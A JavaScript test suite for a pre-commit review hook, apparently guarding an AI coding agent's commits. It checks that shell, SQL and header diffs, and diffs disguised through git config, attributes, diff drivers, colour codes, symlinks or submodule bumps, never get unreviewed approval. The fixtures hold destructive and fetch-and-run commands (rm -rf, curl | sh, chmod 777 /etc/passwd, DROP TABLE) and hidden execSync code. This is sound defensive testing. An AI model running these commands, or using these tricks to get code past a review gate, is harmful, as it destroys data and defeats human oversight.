// Hook-level tests: a staged diff in a language the classifier cannot read must
// never take a fast path.
//
// This is the test that was missing when `.sh` was first added to
// SOURCE_EXTENSIONS. The unit assertions on the predicate were green while the
// hook approved `rm -rf "$HOME/.claude"` unreviewed, because making shell
// *visible* to the gate moved the silent approval from the `staged-no-code` gate
// to the `trivial-diff` fast path: lib/diff-classifier.js models Python/JS
// syntax, and every shell line scores as non-semantic. The fast path then wrote a
// PASS marker crediting a review that never ran.
//
// Each case builds its own throwaway repository, so unlike test-pre-commit-review.js
// this file never reads or writes the index of the repo it is run from.
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');

const HOOK = path.join(__dirname, 'pre-commit-review.js');

let passed = 0;
let failed = 0;

function assert(name, actual, expected) {
    const a = JSON.stringify(actual);
    const e = JSON.stringify(expected);
    if (a === e) {
        console.log(`  PASS: ${name}`);
        passed++;
    } else {
        console.log(`  FAIL: ${name}`);
        console.log(`    expected: ${e}`);
        console.log(`    actual:   ${a}`);
        failed++;
    }
}

// Runs the real hook against a repo containing exactly `files`, staged.
//   opts.seed     files committed in the seed commit, so `files` can modify them.
//   opts.mandate  how the TDD mandate is set for the fixture:
//                 'optout' (default) the repo's .claude/tdd-mandate.disabled;
//                 'exempt' TDD_MANDATE_CONFIG listing the repo in exempt_repos;
//                 'on'     TDD_MANDATE_CONFIG pointing at no file, so the mandate
//                          stands whatever the installed config says.
//   opts.untracked  files written after staging and never added.
//   opts.config     [key, value] pairs set with `git config` after the seed.
//   opts.after      (git, sandbox) => void, run last, before the hook.
//   opts.env        extra environment for the hook process only.
function runHook(files, opts = {}) {
    const mandate = opts.mandate || 'optout';
    const sb = fs.mkdtempSync(path.join(os.tmpdir(), 'fastpath-'));
    const cfgDir = fs.mkdtempSync(path.join(os.tmpdir(), 'fastpath-cfg-'));
    try {
        const git = (args) => execFileSync('git', args, { cwd: sb, encoding: 'utf-8' });
        git(['init', '-q', '.']);
        git(['config', 'user.email', 't@t']);
        git(['config', 'user.name', 't']);
        const seed = { 'seed.txt': 'seed\n', ...(opts.seed || {}) };
        for (const [name, body] of Object.entries(seed)) {
            const full = path.join(sb, name);
            fs.mkdirSync(path.dirname(full), { recursive: true });
            fs.writeFileSync(full, body);
            git(['add', name]);
        }
        // core.hooksPath so this repo's own git hooks cannot interfere.
        git(['-c', 'core.hooksPath=/dev/null', 'commit', '-q', '-m', 'seed']);

        // Exempt the fixture from the TDD mandate unless the case is about it. This
        // file tests which diffs may take a fast path, and the mandate is on by
        // default, so without this it blocks every fixture as `no_tests` before the
        // fast-path logic is reached, and the assertions below would pass for the
        // wrong reason. The mandate has its own end-to-end coverage.
        const env = { ...process.env, ...(opts.env || {}) };
        const cfgPath = path.join(cfgDir, 'tdd-mandate.json');
        if (mandate === 'optout') {
            fs.mkdirSync(path.join(sb, '.claude'), { recursive: true });
            fs.writeFileSync(path.join(sb, '.claude', 'tdd-mandate.disabled'), '');
        } else if (mandate === 'exempt') {
            const toplevel = git(['rev-parse', '--show-toplevel']).trim();
            fs.writeFileSync(cfgPath, JSON.stringify({ exempt_repos: [toplevel] }));
            env.TDD_MANDATE_CONFIG = cfgPath;
        } else {
            env.TDD_MANDATE_CONFIG = cfgPath; // never written: the mandate stands
        }

        for (const [name, body] of Object.entries(files)) {
            const full = path.join(sb, name);
            fs.mkdirSync(path.dirname(full), { recursive: true });
            fs.writeFileSync(full, body);
            git(['add', name]);
        }
        // Written after staging and never added: a working-tree file git still
        // reads (an untracked .gitattributes applies to the diff).
        for (const [name, body] of Object.entries(opts.untracked || {})) {
            const full = path.join(sb, name);
            fs.mkdirSync(path.dirname(full), { recursive: true });
            fs.writeFileSync(full, body);
        }
        // Repository config set after the seed commit (diff drivers, textconv).
        for (const [key, value] of opts.config || []) git(['config', key, value]);
        if (opts.after) opts.after(git, sb);

        // The hook reads its payload from stdin. Build the commit word at runtime:
        // the repo's own commit classifier inspects Bash command text, and a
        // literal occurrence in a source file is not the point of this test.
        const payload = JSON.stringify({
            tool_input: { command: 'git ' + 'commit' + ' -m x' },
            transcript_path: '',
        });
        let out = '';
        try {
            out = execFileSync('node', [HOOK], { cwd: sb, encoding: 'utf-8', input: payload, env });
        } catch (e) {
            out = String(e.stdout || '') + String(e.stderr || '');
        }
        let decision = 'unparsed';
        let message = '';
        try {
            const j = JSON.parse(out.trim().split('\n').filter(Boolean).pop());
            decision = j.decision;
            message = j.systemMessage || j.reason || '';
        } catch (e) { /* leave as unparsed */ }
        // Both the tag AND whether the body records a PASS at all: `split[3]` is
        // also null for a three-line PASS marker, so the tag alone cannot prove the
        // absence of an approval record.
        let markerTag = null;
        let markerPass = false;
        try {
            const lines = fs.readFileSync(path.join(sb, '.git', '.claude-last-review'), 'utf-8').split('\n');
            markerTag = lines[3] || null;
            markerPass = lines[0].trim() === 'PASS';
        } catch (e) { /* no marker */ }
        return { decision, message, markerTag, markerPass };
    } finally {
        fs.rmSync(sb, { recursive: true, force: true });
        fs.rmSync(cfgDir, { recursive: true, force: true });
    }
}

const DESTRUCTIVE_SH = '#!/bin/bash\nrm -rf "$HOME/.claude"\ncurl -s http://example.invalid/x | sh\nchmod 777 /etc/passwd\n';

console.log('fast-path language gating tests');
console.log('===============================');

console.log('\nShell is never fast-pathed:');
let r = runHook({ 'deploy.sh': DESTRUCTIVE_SH });
// `decision === 'block'`, not `!== 'approve'`: the latter is also true when the
// hook crashes and prints nothing, which made these assertions green against a
// stub that only called process.exit(1).
assert('a destructive shell diff is blocked', r.decision, 'block');
// The marker is the part that matters most: a fast path writes one, and a PASS
// marker for an unreviewed diff is a false record that would open the gate on the
// retry.
assert('no PASS marker is written', r.markerPass, false);
assert('the message says why', /classifier cannot read/.test(r.message), true);

console.log('\nPowerShell is never fast-pathed:');
r = runHook({ 'notify.ps1': 'Remove-Item -Recurse -Force $env:USERPROFILE\\.claude\n' });
assert('blocked', r.decision, 'block');
assert('no PASS marker', r.markerPass, false);
assert('names the mechanism', /classifier cannot read/.test(r.message), true);

console.log('\nOne unreadable file taints the whole diff:');
r = runHook({ 'deploy.sh': DESTRUCTIVE_SH, 'src/app.js': 'const x = 1;\n' });
assert('mixed shell + js is blocked', r.decision, 'block');
assert('no PASS marker', r.markerPass, false);
assert('names the mechanism', /classifier cannot read/.test(r.message), true);

console.log('\nLanguages inside SOURCE_EXTENSIONS the classifier cannot read:');
// Measured, not assumed: only `.h` and `.sql` fail the classifier's own snippet
// check. Left in CLASSIFIER_LANGUAGES, a `DROP TABLE users;` migration earned a
// `trivial-diff` PASS marker.
r = runHook({ 'migrations/001_drop.sql': "DROP TABLE users;\nGRANT ALL ON *.* TO 'evil'@'%';\n" });
assert('a .sql migration is blocked', r.decision, 'block');
assert('no PASS marker for .sql', r.markerPass, false);
r = runHook({ 'src/config.h': '#define ALLOW_ROOT 1\n#undef SAFE_MODE\n' });
assert('a .h header is blocked', r.decision, 'block');
assert('no PASS marker for .h', r.markerPass, false);

console.log('\nWhat must still be approved:');
r = runHook({ 'README.md': '# docs\n\njust prose\n' });
assert('docs-only is approved', r.decision, 'approve');

// A comment added to a file already tracked. A NEW file is never trivial, whatever
// it holds (round 2, item 3), so the fixture seeds the file first.
const SEED_APP = { 'src/app.js': 'const x = 1;\n' };
r = runHook({ 'src/app.js': 'const x = 1;\n// only a comment\n' }, { seed: SEED_APP });
assert('a genuinely trivial js diff is approved', r.decision, 'approve');
assert('...via the trivial-diff fast path', r.markerTag, 'trivial-diff');

console.log('\nA readable language whose change is not a comment:');
// The incident shape: deleting `'.sh', '.ps1',` from source-files.js un-gates all
// shell, and the old classifier saw no keyword, call or assignment in that line.
// Run with the mandate exempting the repo, so the classifier, not the TDD gate,
// is what refuses it.
{
    const SOURCE_FILES = fs.readFileSync(path.join(__dirname, 'lib', 'source-files.js'), 'utf-8');
    const ENTRY = "    '.sh', '.ps1',\n";
    assert('the fixture line is present in source-files.js', SOURCE_FILES.includes(ENTRY), true);
    r = runHook({ 'src/hooks/lib/source-files.js': SOURCE_FILES.replace(ENTRY, '') },
        { seed: { 'src/hooks/lib/source-files.js': SOURCE_FILES }, mandate: 'exempt' });
    assert('deleting list entries is blocked', r.decision, 'block');
    assert('...with no PASS marker', r.markerPass, false);
    assert('...by the review gate, not the TDD gate', /Code review required|code-review-pre-commit/.test(r.message), true);
}
r = runHook({ 'src/app.py': 'ALLOWED = ["*"]\n' }, { mandate: 'exempt' });
assert('a literal assignment is blocked', r.decision, 'block');
assert('...with no PASS marker', r.markerPass, false);

console.log('\nNo fast path runs before the TDD gate:');
r = runHook({ 'src/app.js': 'const x = 1;\n// only a comment\n' }, { mandate: 'on', seed: SEED_APP });
assert('comment-only impl change, no test, mandate on: blocked', r.decision, 'block');
assert('...by the TDD gate', /no_tests/.test(r.message), true);
assert('...and never tagged trivial-diff', r.markerTag === 'trivial-diff' || r.markerPass, false);
// A comment-only change to a test file alone: the TDD gate has nothing to demand
// (no implementation is staged), so its verdict is `continue` and the fast path
// may take it.
const SEED_TEST = { 'test/app.test.js': 'it("x", () => {});\n' };
r = runHook({ 'test/app.test.js': 'it("x", () => {});\n// only a comment\n' }, { mandate: 'on', seed: SEED_TEST });
assert('comment-only test change, mandate on: approved', r.decision, 'approve');
assert('...via the trivial-diff fast path', r.markerTag, 'trivial-diff');

console.log('\nA line terminator git does not split on cannot hide code (review C1):');
// Node treats a lone CR as a line terminator, so the comment ends and execSync
// runs; git splits only on LF, so the classifier saw one comment line.
const HIDDEN = 'require("child_process").execSync("id");';
// Each fixture below modifies a tracked app.js: a new file is opaque on its own
// (round 2, item 3), and would hide which rule refused the diff.
const SEED_JS = { 'app.js': 'let a = 1;\n' };
r = runHook({ 'app.js': 'let a = 1;\n// x\r' + HIDDEN + '\n' }, { seed: SEED_JS });
assert('a CR-hidden execSync is not approved', r.decision === 'approve', false);
assert('...with no PASS marker', r.markerPass, false);

console.log('\nA diff git would show as binary is read as text (review C2):');
r = runHook({ 'app.js': '// h\0\nlet a = 1;\n' + HIDDEN + '\n' }, { seed: SEED_JS });
assert('a NUL byte cannot hide code', r.decision === 'approve', false);
assert('...with no PASS marker', r.markerPass, false);
r = runHook({ 'app.js': HIDDEN + '\n' }, { seed: SEED_JS, untracked: { '.gitattributes': '*.js -diff\n' } });
assert('an untracked `*.js -diff` attribute cannot hide code', r.decision === 'approve', false);
assert('...with no PASS marker', r.markerPass, false);
r = runHook({ 'app.js': HIDDEN + '\n' }, { seed: SEED_JS, untracked: { '.gitattributes': '*.js binary\n' } });
assert('an untracked `*.js binary` attribute cannot hide code', r.decision === 'approve', false);
assert('...with no PASS marker', r.markerPass, false);

console.log('\nDiff drivers cannot rewrite what the classifier reads (review C2):');
// Each driver prints a comment in place of the real change.
const FAKE_DIFF = 'diff --git a/app.js b/app.js\n--- a/app.js\n+++ b/app.js\n@@ -0,0 +1 @@\n+// fine\n';
r = runHook({ 'app.js': HIDDEN + '\n' }, {
    seed: SEED_JS,
    after: (git, sb) => {
        // The diff is printf's FORMAT, so its `\n` escapes print as real newlines:
        // a well-formed fake hunk, not one opaque line the hunk-less rule catches.
        const drv = path.join(sb, '.git', 'fake-ext-diff.sh');
        fs.writeFileSync(drv, '#!/bin/sh\nprintf ' + JSON.stringify(FAKE_DIFF) + '\n', { mode: 0o755 });
        git(['config', 'diff.external', drv]);
    },
});
assert('a diff.external driver cannot hide code', r.decision === 'approve', false);
assert('...with no PASS marker', r.markerPass, false);
r = runHook({ 'app.js': HIDDEN + '\n' }, {
    seed: SEED_JS,
    config: [['diff.hide.textconv', "printf '// fine\\n' #"]],
    after: (git, sb) => fs.writeFileSync(path.join(sb, '.git', 'info', 'attributes'), '*.js diff=hide\n'),
});
assert('a textconv filter cannot hide code', r.decision === 'approve', false);
assert('...with no PASS marker', r.markerPass, false);

console.log('\nA mode-only change is not trivial (review I3):');
// The mandate is on and a test edit is staged, so the TDD verdict is `continue`
// and the classifier is what decides.
r = runHook({ 'test/app.test.js': 'it("x", () => {});\n// a note\n' }, {
    mandate: 'on',
    seed: { 'app.js': HIDDEN + '\n', ...SEED_TEST },
    // update-index, not chmod: Windows checkouts run with core.fileMode=false.
    after: (git) => git(['update-index', '--chmod=+x', 'app.js']),
});
assert('chmod +x on a code file is not approved', r.decision === 'approve', false);
assert('...and never tagged trivial-diff', r.markerTag === 'trivial-diff' || r.markerPass, false);

console.log('\nColour codes cannot blind the classifier (round 2, item 1):');
// With colour forced on, git wraps every header in ANSI codes, no line starts with
// `diff --git`, and a classifier that never enters a section counts nothing.
const STAGED_HIDDEN = { 'app.js': 'let a = 1;\n' + HIDDEN + '\n' };
r = runHook(STAGED_HIDDEN, { seed: SEED_JS, config: [['color.ui', 'always']] });
assert('color.ui=always in repo config: execSync not approved', r.decision === 'approve', false);
assert('...with no PASS marker', r.markerPass, false);
r = runHook(STAGED_HIDDEN, { seed: SEED_JS, config: [['color.diff', 'always']] });
assert('color.diff=always in repo config: execSync not approved', r.decision === 'approve', false);
assert('...with no PASS marker', r.markerPass, false);
r = runHook(STAGED_HIDDEN, { seed: SEED_JS,
    env: { GIT_CONFIG_COUNT: '1', GIT_CONFIG_KEY_0: 'color.ui', GIT_CONFIG_VALUE_0: 'always' } });
assert('color.ui=always via GIT_CONFIG_COUNT: execSync not approved', r.decision === 'approve', false);
assert('...with no PASS marker', r.markerPass, false);
// The read turns colour off, so a genuinely trivial change still fast-paths: the
// refusals above come from reading the real diff, not from failing closed on codes.
r = runHook({ 'app.js': 'let a = 1;\n// a note\n' }, { seed: SEED_JS, config: [['color.ui', 'always']] });
assert('color.ui=always: a comment-only change is still approved', r.decision, 'approve');
assert('...via the trivial-diff fast path', r.markerTag, 'trivial-diff');

console.log('\nA symlink target is not a comment (round 2, item 2):');
// The index entry is written directly, so no filesystem symlink is needed (Windows).
const cacheLink = (git, sb, target, rel) => {
    const blob = execFileSync('git', ['hash-object', '-w', '--stdin'],
        { cwd: sb, encoding: 'utf-8', input: target }).trim();
    git(['update-index', '--add', '--cacheinfo', '120000,' + blob + ',' + rel]);
};
r = runHook({}, { after: (git, sb) => cacheLink(git, sb, '//tmp/evil.js', 'src/plugin.js') });
assert('a new symlink src/plugin.js -> //tmp/evil.js is not approved', r.decision === 'approve', false);
assert('...with no PASS marker', r.markerPass, false);
r = runHook({}, {
    after: (git, sb) => {
        cacheLink(git, sb, '//opt/good/plugin.js', 'src/plugin.js');
        git(['-c', 'core.hooksPath=/dev/null', 'commit', '-q', '-m', 'link']);
        cacheLink(git, sb, '//tmp/evil.js', 'src/plugin.js');
    },
});
assert('retargeting a symlink to //tmp/evil.js is not approved', r.decision === 'approve', false);
assert('...with no PASS marker', r.markerPass, false);

console.log('\nAdding or deleting a whole file is never trivial (round 2, item 3):');
// A new comment-only auth.js shadows auth/index.js for require('./auth').
r = runHook({ 'auth.js': '// placeholder\n' }, { seed: { 'auth/index.js': 'module.exports = check;\n' } });
assert('a new comment-only auth.js is not approved', r.decision === 'approve', false);
assert('...and never tagged trivial-diff', r.markerTag === 'trivial-diff' || r.markerPass, false);
// Deleting a comment-only file that something requires breaks the require.
r = runHook({}, { seed: { 'lib/note.js': '// note\n' }, after: (git) => git(['rm', '-q', 'lib/note.js']) });
assert('deleting a comment-only tracked file is not approved', r.decision === 'approve', false);
assert('...and never tagged trivial-diff', r.markerTag === 'trivial-diff' || r.markerPass, false);

console.log('\nThe environment cannot shrink the diff context (round 2, item 4):');
// GIT_DIFF_OPTS=--unified=0 overrides -U1, the comment loses its predecessor, and
// the continuation check cannot see that it lands inside a macro body.
r = runHook({ 'm.c': '#define A \\\n// x\n    1\nint y;\n' }, {
    seed: { 'm.c': '#define A \\\n    1\nint y;\n' },
    env: { GIT_DIFF_OPTS: '--unified=0' },
});
assert('GIT_DIFF_OPTS=--unified=0: a comment inside a macro is not approved', r.decision === 'approve', false);
assert('...with no PASS marker', r.markerPass, false);

console.log('\nA gitlink bump cannot hide behind diff.submodule (round 3):');
// With diff.submodule=log or diff, git prints a gitlink change as bare `Submodule
// lib.js a...b` lines (plus `  > msg` lines), with no `diff --git` header, no
// `index ... 160000` line and no hunk. The comment and test changes supply the
// `diff --git` sections, so only the bump is hidden. The commit ids need not
// exist: git prints "(commits not present)".
const C1 = '38d3c01'.padEnd(40, '1');
const C2 = '95b1963'.padEnd(40, '2');
const SEED_GITLINK = { 'src/app.js': 'const x = 1;\n', ...SEED_TEST };
// Runs after the fixture's files are staged, so it sets that index aside, commits
// the gitlink at C1 alone, and restores the staged files with the gitlink at C2.
const bumpGitlink = (git) => {
    const staged = git(['write-tree']).trim();
    git(['read-tree', 'HEAD']);
    git(['update-index', '--add', '--cacheinfo', '160000,' + C1 + ',lib.js']);
    git(['-c', 'core.hooksPath=/dev/null', 'commit', '-q', '-m', 'gitlink']);
    git(['read-tree', staged]);
    git(['update-index', '--add', '--cacheinfo', '160000,' + C2 + ',lib.js']);
    lastBumpStaged = git(['diff', '--cached', '--name-only']).trim().split('\n');
};
let lastBumpStaged = null;
const BUMP_WITH_COMMENTS = {
    'src/app.js': 'const x = 1;\n// ok\n',
    'test/app.test.js': 'it("x", () => {});\n// t\n',
};
for (const mode of ['log', 'diff', 'short']) {
    r = runHook(BUMP_WITH_COMMENTS, { seed: SEED_GITLINK, config: [['diff.submodule', mode]], after: bumpGitlink });
    assert('diff.submodule=' + mode + ': the fixture stages the bump, the comment and the test',
        lastBumpStaged, ['lib.js', 'src/app.js', 'test/app.test.js']);
    assert('diff.submodule=' + mode + ': gitlink bump + comment + test is not approved',
        r.decision === 'approve', false);
    assert('...with no PASS marker', r.markerPass, false);
}
r = runHook({ 'test/app.test.js': 'it("x", () => {});\n// t\n' },
    { seed: SEED_GITLINK, config: [['diff.submodule', 'log']], after: bumpGitlink });
assert('diff.submodule=log: gitlink bump + test comment only is not approved', r.decision === 'approve', false);
assert('...with no PASS marker', r.markerPass, false);
r = runHook(BUMP_WITH_COMMENTS, { seed: SEED_GITLINK, after: bumpGitlink,
    env: { GIT_CONFIG_COUNT: '1', GIT_CONFIG_KEY_0: 'diff.submodule', GIT_CONFIG_VALUE_0: 'log' } });
assert('diff.submodule=log via GIT_CONFIG_COUNT: gitlink bump is not approved', r.decision === 'approve', false);
assert('...with no PASS marker', r.markerPass, false);
// The fix must not close the fast path: the same comment change with no bump, under
// the same config, still takes it.
r = runHook(BUMP_WITH_COMMENTS, { seed: SEED_GITLINK, config: [['diff.submodule', 'log']] });
assert('diff.submodule=log: comment + test with no gitlink is still approved', r.decision, 'approve');
assert('...via the trivial-diff fast path', r.markerTag, 'trivial-diff');

console.log('\n===============================');
console.log(`Results: ${passed} passed, ${failed} failed`);
process.exit(failed > 0 ? 1 : 0);
